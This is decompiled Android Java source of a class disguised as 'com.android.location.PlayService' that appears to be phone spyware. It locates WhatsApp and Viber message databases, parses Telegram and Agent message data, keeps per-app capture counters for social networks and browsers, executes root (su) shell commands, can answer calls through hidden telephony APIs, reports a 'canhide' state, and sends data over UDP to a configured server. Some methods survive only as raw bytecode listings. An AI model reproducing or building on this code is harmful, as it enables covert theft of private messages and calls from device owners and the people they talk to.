    sBLockIPList = "";
    sAnswerList = "";
    iBitRate = 0;
    iSamplingRate = 0;
    iRecAfterCall = 0;
    iTransfer = 0;
    iTransferBinary = 0;
    iTransferBinaryUnlim = 1;
    iLastIntPictureRed = 0L;
    iLastExtPictureRed = 0L;
    lLastInstagram = 0L;
    iLastIntVideoRed = 0L;
    iLastExtVideoRed = 0L;
    sSimID = "";
    sRecWhiteList = "";
    sRecBlackList = "";
    lWhatsAppCounter = 0L;
    lVKCounter = 0L;
    lTGCounter = 0L;
    lFBCounter = 0L;
    lOKCounter = 0L;
    sWhatsAppPath = "";
    lViberCounter = 0L;
    lViberAttCounter = 0;
    lAgentCount = 0L;
    lWAAttCounter = 0;
    lTGAttCounter = 0L;
    lFBAttCounter = 0L;
    lAgentAttCounter = 0L;
    lOKAttCounter = 0L;
    sViberPath = "";
    sSyncFolder = "";
    lSyncFolderLastTime = 0L;
    lOperaCounter = 0L;
    lOperaMiniCounter = 0L;
    iChromeCounter = 0;
    iFirefoxCounter = 0;
    if (iConfig == 2) {
      sBLockIPList = "5.200.37.186";
    }
    if (iConfig == 5) {
      sBLockIPList = "54.229.40.124,203.80.152.35";
    }
    SetDefaultHostAndPort();
  }
  
  /* Error */
  public static void TLOG(StackTraceElement[] paramArrayOfStackTraceElement, String paramString, Exception paramException)
  {
    // Byte code:
    //   0: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   3: ifnonnull +4 -> 7
    //   6: return
    //   7: aload_2
    //   8: ifnull -2 -> 6
    //   11: aconst_null
    //   12: astore 11
    //   14: aconst_null
    //   15: astore 10
    //   17: aconst_null
    //   18: astore 8
    //   20: aconst_null
    //   21: astore 9
    //   23: aconst_null
    //   24: astore 5
    //   26: aload 10
    //   28: astore 7
    //   30: aload 11
    //   32: astore 4
    //   34: aload 9
    //   36: astore 6
    //   38: new 864	java/lang/StringBuilder
    //   41: dup
    //   42: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   45: invokestatic 2557	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   48: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   51: ldc_w 2559
    //   54: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   57: aload_1
    //   58: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   61: ldc_w 2561
    //   64: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   67: astore 12
    //   69: aload_2
    //   70: ifnonnull +389 -> 459
    //   73: ldc_w 2563
    //   76: astore_1
    //   77: aload 10
    //   79: astore 7
    //   81: aload 11
    //   83: astore 4
    //   85: aload 9
    //   87: astore 6
    //   89: aload 12
    //   91: aload_1
    //   92: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   95: ldc_w 1312
    //   98: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   101: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   104: astore 12
    //   106: aload 10
    //   108: astore 7
    //   110: aload 11
    //   112: astore 4
    //   114: aload 9
    //   116: astore 6
    //   118: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   121: ifnull +23 -> 144
    //   124: iconst_0
    //   125: istore_3
    //   126: aload 10
    //   128: astore 7
    //   130: aload 11
    //   132: astore 4
    //   134: aload 9
    //   136: astore 6
    //   138: iload_3
    //   139: aload_0
    //   140: arraylength
    //   141: if_icmplt +338 -> 479
    //   144: aload 10
    //   146: astore 7
    //   148: aload 11
    //   150: astore 4
    //   152: aload 9
    //   154: astore 6
    //   156: new 1250	java/io/File
    //   159: dup
    //   160: new 864	java/lang/StringBuilder
    //   163: dup
    //   164: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   167: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   170: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   173: ldc_w 1717
    //   176: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   179: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   182: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   185: ldc_w 2501
    //   188: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   191: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   194: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   197: astore_1
    //   198: aload_1
    //   199: ifnull +62 -> 261
    //   202: aload 10
    //   204: astore 7
    //   206: aload 11
    //   208: astore 4
    //   210: aload 9
    //   212: astore 6
    //   214: aload_1
    //   215: invokevirtual 1257	java/io/File:exists	()Z
    //   218: ifeq +43 -> 261
    //   221: aload 10
    //   223: astore 7
    //   225: aload 11
    //   227: astore 4
    //   229: aload 9
    //   231: astore 6
    //   233: aload_1
    //   234: invokevirtual 1277	java/io/File:length	()J
    //   237: ldc2_w 1718
    //   240: lcmp
    //   241: ifle +20 -> 261
    //   244: aload 10
    //   246: astore 7
    //   248: aload 11
    //   250: astore 4
    //   252: aload 9
    //   254: astore 6
    //   256: aload_1
    //   257: invokevirtual 1281	java/io/File:delete	()Z
    //   260: pop
    //   261: aload 10
    //   263: astore 7
    //   265: aload 11
    //   267: astore 4
    //   269: aload 9
    //   271: astore 6
    //   273: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   276: new 864	java/lang/StringBuilder
    //   279: dup
    //   280: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   283: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   286: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   289: ldc_w 2501
    //   292: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   295: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   298: ldc -96
    //   300: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   303: astore_1
    //   304: aload 5
    //   306: astore 4
    //   308: aload_1
    //   309: ifnull +129 -> 438
    //   312: aload_1
    //   313: astore 7
    //   315: aload_1
    //   316: astore 4
    //   318: aload 9
    //   320: astore 6
    //   322: aload_1
    //   323: invokevirtual 1293	java/io/FileOutputStream:getFD	()Ljava/io/FileDescriptor;
    //   326: astore 10
    //   328: aload 5
    //   330: astore 4
    //   332: aload 10
    //   334: ifnull +104 -> 438
    //   337: aload_1
    //   338: astore 7
    //   340: aload_1
    //   341: astore 4
    //   343: aload 9
    //   345: astore 6
    //   347: new 1289	java/io/FileWriter
    //   350: dup
    //   351: aload 10
    //   353: invokespecial 1296	java/io/FileWriter:<init>	(Ljava/io/FileDescriptor;)V
    //   356: astore 5
    //   358: aload 5
    //   360: ifnull +307 -> 667
    //   363: new 1298	java/io/BufferedWriter
    //   366: dup
    //   367: aload 5
    //   369: sipush 1024
    //   372: invokespecial 1301	java/io/BufferedWriter:<init>	(Ljava/io/Writer;I)V
    //   375: astore 4
    //   377: aload 4
    //   379: ifnull +288 -> 667
    //   382: aload 4
    //   384: aload 12
    //   386: invokevirtual 1315	java/io/BufferedWriter:write	(Ljava/lang/String;)V
    //   389: iconst_0
    //   390: istore_3
    //   391: iload_3
    //   392: aload_0
    //   393: arraylength
    //   394: if_icmplt +141 -> 535
    //   397: aload_2
    //   398: ifnull +31 -> 429
    //   401: aload 4
    //   403: new 864	java/lang/StringBuilder
    //   406: dup
    //   407: aload_2
    //   408: invokevirtual 1645	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   411: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   414: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   417: ldc_w 1312
    //   420: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   423: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   426: invokevirtual 1315	java/io/BufferedWriter:write	(Ljava/lang/String;)V
    //   429: aload 4
    //   431: invokevirtual 1318	java/io/BufferedWriter:close	()V
    //   434: aload 5
    //   436: astore 4
    //   438: aload_1
    //   439: ifnull +7 -> 446
    //   442: aload_1
    //   443: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   446: aload 4
    //   448: ifnull -442 -> 6
    //   451: aload 4
    //   453: invokevirtual 1320	java/io/FileWriter:close	()V
    //   456: return
    //   457: astore_0
    //   458: return
    //   459: aload 10
    //   461: astore 7
    //   463: aload 11
    //   465: astore 4
    //   467: aload 9
    //   469: astore 6
    //   471: aload_2
    //   472: invokevirtual 1645	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   475: astore_1
    //   476: goto -399 -> 77
    //   479: aload 10
    //   481: astore 7
    //   483: aload 11
    //   485: astore 4
    //   487: aload 9
    //   489: astore 6
    //   491: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   494: new 864	java/lang/StringBuilder
    //   497: dup
    //   498: aload_0
    //   499: iload_3
    //   500: aaload
    //   501: invokevirtual 1684	java/lang/StackTraceElement:toString	()Ljava/lang/String;
    //   504: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   507: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   510: ldc_w 1312
    //   513: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   516: aload 12
    //   518: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   521: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   524: invokevirtual 1715	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   527: pop
    //   528: iload_3
    //   529: iconst_1
    //   530: iadd
    //   531: istore_3
    //   532: goto -406 -> 126
    //   535: aload 4
    //   537: new 864	java/lang/StringBuilder
    //   540: dup
    //   541: aload_0
    //   542: iload_3
    //   543: aaload
    //   544: invokevirtual 1684	java/lang/StackTraceElement:toString	()Ljava/lang/String;
    //   547: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   550: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   553: ldc_w 1312
    //   556: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   559: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   562: invokevirtual 1315	java/io/BufferedWriter:write	(Ljava/lang/String;)V
    //   565: iload_3
    //   566: iconst_1
    //   567: iadd
    //   568: istore_3
    //   569: goto -178 -> 391
    //   572: astore_2
    //   573: aload 8
    //   575: astore_0
    //   576: aload 7
    //   578: astore_1
    //   579: aload_2
    //   580: ifnull +13 -> 593
    //   583: aload_1
    //   584: astore 4
    //   586: aload_0
    //   587: astore 6
    //   589: aload_2
    //   590: invokevirtual 1673	java/lang/Exception:printStackTrace	()V
    //   593: aload_1
    //   594: ifnull +7 -> 601
    //   597: aload_1
    //   598: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   601: aload_0
    //   602: ifnull -596 -> 6
    //   605: aload_0
    //   606: invokevirtual 1320	java/io/FileWriter:close	()V
    //   609: return
    //   610: astore_0
    //   611: return
    //   612: astore_0
    //   613: aload 4
    //   615: astore_1
    //   616: aload_1
    //   617: ifnull +7 -> 624
    //   620: aload_1
    //   621: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   624: aload 6
    //   626: ifnull +8 -> 634
    //   629: aload 6
    //   631: invokevirtual 1320	java/io/FileWriter:close	()V
    //   634: aload_0
    //   635: athrow
    //   636: astore_1
    //   637: goto -36 -> 601
    //   640: astore_1
    //   641: goto -17 -> 624
    //   644: astore_1
    //   645: goto -11 -> 634
    //   648: astore_0
    //   649: goto -203 -> 446
    //   652: astore_0
    //   653: aload 5
    //   655: astore 6
    //   657: goto -41 -> 616
    //   660: astore_2
    //   661: aload 5
    //   663: astore_0
    //   664: goto -85 -> 579
    //   667: aload 5
    //   669: astore 4
    //   671: goto -233 -> 438
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	674	0	paramArrayOfStackTraceElement	StackTraceElement[]
    //   0	674	1	paramString	String
    //   0	674	2	paramException	Exception
    //   125	444	3	i	int
    //   32	638	4	localObject1	Object
    //   24	644	5	localFileWriter	java.io.FileWriter
    //   36	620	6	localObject2	Object
    //   28	549	7	localObject3	Object
    //   18	556	8	localObject4	Object
    //   21	467	9	localObject5	Object
    //   15	465	10	localFileDescriptor	FileDescriptor
    //   12	472	11	localObject6	Object
    //   67	450	12	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   451	456	457	java/io/IOException
    //   38	69	572	java/lang/Exception
    //   89	106	572	java/lang/Exception
    //   118	124	572	java/lang/Exception
    //   138	144	572	java/lang/Exception
    //   156	198	572	java/lang/Exception
    //   214	221	572	java/lang/Exception
    //   233	244	572	java/lang/Exception
    //   256	261	572	java/lang/Exception
    //   273	304	572	java/lang/Exception
    //   322	328	572	java/lang/Exception
    //   347	358	572	java/lang/Exception
    //   471	476	572	java/lang/Exception
    //   491	528	572	java/lang/Exception
    //   605	609	610	java/io/IOException
    //   38	69	612	finally
    //   89	106	612	finally
    //   118	124	612	finally
    //   138	144	612	finally
    //   156	198	612	finally
    //   214	221	612	finally
    //   233	244	612	finally
    //   256	261	612	finally
    //   273	304	612	finally
    //   322	328	612	finally
    //   347	358	612	finally
    //   471	476	612	finally
    //   491	528	612	finally
    //   589	593	612	finally
    //   597	601	636	java/io/IOException
    //   620	624	640	java/io/IOException
    //   629	634	644	java/io/IOException
    //   442	446	648	java/io/IOException
    //   363	377	652	finally
    //   382	389	652	finally
    //   391	397	652	finally
    //   401	429	652	finally
    //   429	434	652	finally
    //   535	565	652	finally
    //   363	377	660	java/lang/Exception
    //   382	389	660	java/lang/Exception
    //   391	397	660	java/lang/Exception
    //   401	429	660	java/lang/Exception
    //   429	434	660	java/lang/Exception
    //   535	565	660	java/lang/Exception
  }
  
  private String Till2(String paramString)
  {
    FLOG("Till=" + paramString);
    String str;
    if (paramString == null) {
      str = "";
    }
    int i;
    do
    {
      return str;
      i = paramString.indexOf(2);
      FLOG("undex=" + i);
      str = paramString;
    } while (i <= 0);
    return paramString.substring(0, i);
  }
  
  public static void UDP(String paramString, int paramInt)
  {
    if (paramString == null) {}
    while (paramInt == 0) {
      return;
    }
    try
    {
      DatagramSocket localDatagramSocket = new DatagramSocket();
      InetAddress localInetAddress = InetAddress.getByName(Server);
      paramString = paramString + "\n";
      int i = paramString.length();
      localDatagramSocket.send(new DatagramPacket(paramString.getBytes(), 0, i, localInetAddress, paramInt));
      return;
    }
    catch (Exception paramString) {}
  }
  
  private void UpdateState(String paramString, boolean paramBoolean, byte paramByte)
  {
    Intent localIntent = new Intent("SHADOW_UPDATED");
    localIntent.putExtra("statestring", paramString);
    localIntent.putExtra("canhide", paramBoolean);
    localIntent.putExtra("cansu", paramByte);
    sendBroadcast(localIntent);
  }
  
  public static String UpdateViberPath()
  {
    FLOG("UpdateViberPath()");
    String str = findApplication("com.viber.voip");
    if (str.length() == 0) {
      return "";
    }
    str = str + "/databases/viber_messages";
    FLOG("UpdateViberPath=" + str);
    sViberPath = str;
    return str;
  }
  
  public static String UpdateWhatsAppPath()
  {
    FLOG("UpdateWhatsAppPath()");
    String str = findApplication("com.whatsapp");
    if (str.length() == 0) {
      return "";
    }
    str = str + "/databases/msgstore.db";
    FLOG("UpdateWhatsAppPath=" + str);
    sWhatsAppPath = str;
    return "";
  }
  
  private void answerPhoneAidl(Context paramContext)
    throws Exception
  {
    paramContext = (TelephonyManager)getSystemService("phone");
    Method localMethod = Class.forName(paramContext.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
    localMethod.setAccessible(true);
    this.telephonyService = ((ITelephony)localMethod.invoke(paramContext, new Object[0]));
  }
  
  private static boolean checkSU(String paramString)
  {
    FLOG("CheckSU:" + paramString);
    if (commandSUresult("id").indexOf("uid=0(root)") > -1)
    {
      FLOG("We have ROOT!");
      return true;
    }
    FLOG("We dont have root ^(");
    return false;
  }
  
  private byte[] clearAgentKal(byte[] paramArrayOfByte)
  {
    byte[] arrayOfByte = null;
    if (paramArrayOfByte == null)
    {
      paramArrayOfByte = arrayOfByte;
      return paramArrayOfByte;
    }
    if (paramArrayOfByte.length == 0) {
      return paramArrayOfByte;
    }
    arrayOfByte = (byte[])null;
    if ((paramArrayOfByte[4] == 116) && (paramArrayOfByte[5] == 121) && (paramArrayOfByte[6] == 112) && (paramArrayOfByte[7] == 101)) {}
    for (;;)
    {
      int j;
      try
      {
        return new String("[system]").getBytes();
      }
      catch (Exception paramArrayOfByte)
      {
        EXCEPT(paramArrayOfByte, "clearAngentKal failed");
        paramArrayOfByte = new String("AgentMessageFormatError()");
        FLOG("AgentMessageFormatError()");
        return paramArrayOfByte.getBytes();
      }
      if (j >= paramArrayOfByte.length - 1)
      {
        if (j >= paramArrayOfByte.length - 1) {
          return new String("[end lookup error]").getBytes();
        }
        j -= i;
        if (j <= 0) {
          return new String("[empty]").getBytes();
        }
        arrayOfByte = new byte[j];
        System.arraycopy(paramArrayOfByte, i, arrayOfByte, 0, j);
        int i = 0;
        paramArrayOfByte = arrayOfByte;
        if (i >= arrayOfByte.length) {
          break;
        }
        if ((arrayOfByte[i] & 0xFF) < 10) {
          arrayOfByte[i] = 0;
        }
        i += 1;
        continue;
        if ((paramArrayOfByte[33] & 0xFF) == 137)
        {
          j = 46;
          label223:
          i = paramArrayOfByte[(j + 1)] & 0xFF;
          if ((i >= 10) || (i <= 0)) {
            break label258;
          }
          i = j + 2;
        }
        for (;;)
        {
          j = i;
          break;
          j = 37;
          break label223;
          label258:
          i = j;
          if ((paramArrayOfByte[j] & 0xFF) < 10) {
            i = j + 1;
          }
        }
      }
      if (((paramArrayOfByte[j] != 0) || ((paramArrayOfByte[(j + 1)] & 0xFF) != 1)) && ((paramArrayOfByte[j] != 0) || ((paramArrayOfByte[(j + 1)] & 0xFF) != 2))) {
        j += 1;
      }
    }
  }
  
  private byte[] clearTGKal(byte[] paramArrayOfByte)
  {
    FLOG("clearTGKal() " + paramArrayOfByte);
    byte[] arrayOfByte;
    if (paramArrayOfByte == null) {
      arrayOfByte = null;
    }
    do
    {
      return arrayOfByte;
      arrayOfByte = paramArrayOfByte;
    } while (paramArrayOfByte.length == 0);
    try
    {
      arrayOfByte = new byte[paramArrayOfByte.length - 28];
      FLOG("templen=" + arrayOfByte.length);
      int i = 28;
      int j = paramArrayOfByte[27] & 0xFF;
      FLOG("prepend=" + j);
      if (j / 16 != 5)
      {
        FLOG("prepend not correct, move offset by 4 bytes ahead");
        i = 28 + 4;
      }
      j = paramArrayOfByte[i] & 0xFF;
      FLOG("sign=" + j);
      if (j == 254)
      {
        j = paramArrayOfByte[(i + 1)] & (paramArrayOfByte[(i + 2)] & 0xFF) * 255 + 255;
        FLOG("len=" + j);
        System.arraycopy(paramArrayOfByte, i + 4, arrayOfByte, 0, j);
      }
      for (;;)
      {
        paramArrayOfByte = new byte[j];
        System.arraycopy(arrayOfByte, 0, paramArrayOfByte, 0, j);
        FLOG("str=" + new String(paramArrayOfByte));
        return paramArrayOfByte;
        FLOG("len=" + j);
        System.arraycopy(paramArrayOfByte, i + 1, arrayOfByte, 0, j);
      }
      return paramArrayOfByte.getBytes();
    }
    catch (Exception paramArrayOfByte)
    {
      EXCEPT(paramArrayOfByte, "clearTGKal failed");
      paramArrayOfByte = new String("TGMessageFormatError()");
      FLOG("TGMessageFormatError()");
    }
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4: getstatic 888	com/android/location/PlayService:ROOTED	Z
    //   7: ifne +7 -> 14
    //   10: iconst_3
    //   11: istore_2
    //   12: iload_2
    //   13: ireturn
    //   14: invokestatic 2747	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   17: astore 5
    //   19: aconst_null
    //   20: astore 6
    //   22: aconst_null
    //   23: astore 9
    //   25: aconst_null
    //   26: astore 8
    //   28: iconst_0
    //   29: istore_1
    //   30: aload 5
    //   32: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   35: invokevirtual 2751	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   38: astore 5
    //   40: aload 5
    //   42: astore 6
    //   44: new 2753	java/io/OutputStreamWriter
    //   47: dup
    //   48: aload 5
    //   50: invokevirtual 2759	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   53: invokespecial 2762	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   56: astore 7
    //   58: aload 7
    //   60: aload_0
    //   61: invokevirtual 2763	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   64: aload 7
    //   66: invokevirtual 2766	java/io/OutputStreamWriter:flush	()V
    //   69: aload 7
    //   71: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   74: aload 7
    //   76: ifnull +159 -> 235
    //   79: aload 7
    //   81: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   84: aload 5
    //   86: astore_0
    //   87: iload_1
    //   88: istore_2
    //   89: aload_0
    //   90: ifnull -78 -> 12
    //   93: bipush 30
    //   95: istore_3
    //   96: iload_3
    //   97: iconst_1
    //   98: isub
    //   99: istore 4
    //   101: iload_3
    //   102: ifgt +90 -> 192
    //   105: iload_1
    //   106: istore_2
    //   107: iload 4
    //   109: ifgt -97 -> 12
    //   112: aload_0
    //   113: invokevirtual 2770	java/lang/Process:destroy	()V
    //   116: iload_1
    //   117: ireturn
    //   118: astore_0
    //   119: iconst_3
    //   120: putstatic 583	com/android/location/PlayService:bCanSu	B
    //   123: iconst_3
    //   124: ireturn
    //   125: astore_0
    //   126: aload 6
    //   128: astore 5
    //   130: aload 8
    //   132: astore 6
    //   134: iconst_1
    //   135: istore_2
    //   136: aload 5
    //   138: astore_0
    //   139: iload_2
    //   140: istore_1
    //   141: aload 6
    //   143: ifnull -56 -> 87
    //   146: aload 6
    //   148: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   151: aload 5
    //   153: astore_0
    //   154: iload_2
    //   155: istore_1
    //   156: goto -69 -> 87
    //   159: astore_0
    //   160: aload 5
    //   162: astore_0
    //   163: iload_2
    //   164: istore_1
    //   165: goto -78 -> 87
    //   168: astore_0
    //   169: aload 9
    //   171: astore 5
    //   173: aload 5
    //   175: ifnull +8 -> 183
    //   178: aload 5
    //   180: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   183: aload_0
    //   184: athrow
    //   185: astore_0
    //   186: aload 5
    //   188: astore_0
    //   189: goto -102 -> 87
    //   192: aload_0
    //   193: invokevirtual 2773	java/lang/Process:exitValue	()I
    //   196: pop
    //   197: goto -92 -> 105
    //   200: astore 5
    //   202: ldc2_w 1356
    //   205: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   208: iload 4
    //   210: istore_3
    //   211: goto -115 -> 96
    //   214: astore 5
    //   216: goto -33 -> 183
    //   219: astore_0
    //   220: aload 7
    //   222: astore 5
    //   224: goto -51 -> 173
    //   227: astore_0
    //   228: aload 7
    //   230: astore 6
    //   232: goto -98 -> 134
    //   235: aload 5
    //   237: astore_0
    //   238: goto -151 -> 87
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	241	0	paramString	String
    //   29	136	1	b1	byte
    //   11	153	2	b2	byte
    //   95	116	3	i	int
    //   99	110	4	j	int
    //   17	170	5	localObject1	Object
    //   200	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   214	1	5	localIOException	IOException
    //   222	14	5	localObject2	Object
    //   20	211	6	localObject3	Object
    //   56	173	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   26	105	8	localObject4	Object
    //   23	147	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   112	116	118	java/lang/InterruptedException
    //   192	197	118	java/lang/InterruptedException
    //   202	208	118	java/lang/InterruptedException
    //   30	40	125	java/io/IOException
    //   44	58	125	java/io/IOException
    //   146	151	159	java/io/IOException
    //   30	40	168	finally
    //   44	58	168	finally
    //   79	84	185	java/io/IOException
    //   192	197	200	java/lang/IllegalThreadStateException
    //   178	183	214	java/io/IOException
    //   58	74	219	finally
    //   58	74	227	java/io/IOException
  }
  
  /* Error */
  public static String commandSUresult(String paramString)
  {
    // Byte code:
    //   0: getstatic 888	com/android/location/PlayService:ROOTED	Z
    //   3: ifne +9 -> 12
    //   6: ldc_w 571
    //   9: astore_2
    //   10: aload_2
    //   11: areturn
    //   12: invokestatic 2747	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   15: astore 12
    //   17: aconst_null
    //   18: astore_3
    //   19: aconst_null
    //   20: astore_2
    //   21: aconst_null
    //   22: astore 9
    //   24: aconst_null
    //   25: astore 11
    //   27: aconst_null
    //   28: astore 8
    //   30: aconst_null
    //   31: astore 7
    //   33: ldc_w 571
    //   36: astore 10
    //   38: new 864	java/lang/StringBuilder
    //   41: dup
    //   42: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   45: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   48: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   51: ldc_w 1712
    //   54: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   57: aload_0
    //   58: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   61: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   64: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   67: aload_3
    //   68: astore 6
    //   70: aload 11
    //   72: astore 4
    //   74: aload_2
    //   75: astore 5
    //   77: ldc_w 2775
    //   80: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   83: aload_3
    //   84: astore 6
    //   86: aload 11
    //   88: astore 4
    //   90: aload_2
    //   91: astore 5
    //   93: aload 12
    //   95: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   98: invokevirtual 2751	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   101: astore_3
    //   102: aload_3
    //   103: astore 6
    //   105: aload 11
    //   107: astore 4
    //   109: aload_2
    //   110: astore 5
    //   112: new 864	java/lang/StringBuilder
    //   115: dup
    //   116: ldc_w 2777
    //   119: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   122: aload_3
    //   123: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   126: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   129: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   132: aload_3
    //   133: astore 6
    //   135: aload 11
    //   137: astore 4
    //   139: aload_2
    //   140: astore 5
    //   142: new 2753	java/io/OutputStreamWriter
    //   145: dup
    //   146: aload_3
    //   147: invokevirtual 2759	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   150: invokespecial 2762	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   153: astore_2
    //   154: aload_2
    //   155: aload_0
    //   156: invokevirtual 2763	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   159: aload_2
    //   160: invokevirtual 2766	java/io/OutputStreamWriter:flush	()V
    //   163: aload_2
    //   164: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   167: ldc_w 2779
    //   170: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   173: aload_3
    //   174: ifnull +43 -> 217
    //   177: aload_3
    //   178: invokevirtual 2782	java/lang/Process:waitFor	()I
    //   181: sipush 255
    //   184: if_icmpne +33 -> 217
    //   187: ldc_w 2784
    //   190: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   193: aload_2
    //   194: ifnull +7 -> 201
    //   197: aload_2
    //   198: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   201: iconst_0
    //   202: ifeq +11 -> 213
    //   205: new 1700	java/lang/NullPointerException
    //   208: dup
    //   209: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   212: athrow
    //   213: ldc_w 571
    //   216: areturn
    //   217: ldc_w 2786
    //   220: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   223: sipush 1024
    //   226: newarray char
    //   228: astore 5
    //   230: new 2009	java/io/InputStreamReader
    //   233: dup
    //   234: aload_3
    //   235: invokevirtual 2790	java/lang/Process:getInputStream	()Ljava/io/InputStream;
    //   238: invokespecial 2012	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   241: astore 4
    //   243: aload 10
    //   245: astore_0
    //   246: aload 4
    //   248: aload 5
    //   250: invokevirtual 2793	java/io/InputStreamReader:read	([C)I
